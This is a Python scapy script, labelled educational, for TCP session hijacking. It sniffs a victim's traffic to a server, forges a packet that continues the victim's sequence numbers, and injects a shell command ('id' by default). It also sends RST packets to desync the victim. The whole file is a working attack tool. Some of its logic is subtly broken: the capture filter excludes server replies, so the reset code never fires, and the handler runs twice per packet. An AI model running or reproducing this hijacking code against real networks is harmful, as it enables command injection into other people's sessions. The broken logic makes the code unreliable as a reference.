#!/usr/bin/env python3

import argparse
from scapy.all import sniff, send, IP, TCP, Raw

def build_injection(pkt, payload: bytes):
    """
        Give a sniffed packed from the victim to the server,
        build a forget packet that continues the stream from the victim's current position
    """
    ip = pkt[IP]
    tcp = pkt[TCP]

    next_seq = tcp.seq + len(pkt[TCP].payload)

    forget_ip = IP(src=ip.src, dst=ip.dst)
    forget_tcp = TCP(
        sport=tcp.sport,
        dport=tcp.dport,
        seq=next_seq,
        ack=tcp.ack,
        flags="PA",
        window=tcp.window
    )
    return forget_ip / forget_tcp / Raw(load=payload)

def main():
    parser = argparse.ArgumentParser(description="TCP Hijacking Educational Script")
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--server-ip", required=True)
    parser.add_argument("--server-port", required=True, type=int)
    parser.add_argument("--iface", required=True)
    parser.add_argument(
        "--payload",
        default="id\n",
        help="Command to inject into the hijacked session (default: 'id\\n')"
    )
    args = parser.parse_args()

    bpf = f"tcp and src host {args.victim_ip} and dst host {args.server_ip} and dst port {args.server_port}"
    print(f"[*] Sniffing on {args.iface} for: {bpf}")
    print(f"[*] Waiting for victim to send a data-carrying packet to the server...")

    state = {"desynced": True}

    def handler(pkt):
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return
        
        if pkt[IP].dst == args.victim_ip and pkt[IP].src == args.server_ip:
            rst = IP(src=args.server_ip, dst=args.victim_ip) / TCP(
                sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                flags="R",
                seq=pkt[TCP].ack
            )
            send(rst, iface=args.iface, verbose=False)
            print(f"[+] Sent RST to victim - desyncing")
            state["desynced"] = True
        
        
        if pkt.haslayer(Raw) and pkt[IP].src == args.victim_ip:
            forged = build_injection(pkt, args.payload.encode())
            send(forged, iface=args.iface, verbose=False)
            print(f"[+] Injected: {args.payload!r}")
            return True

    sniff(iface=args.iface, filter=bpf, prn=handler, stop_filter=lambda p: handler(p))

if __name__ == "__main__":
    main()
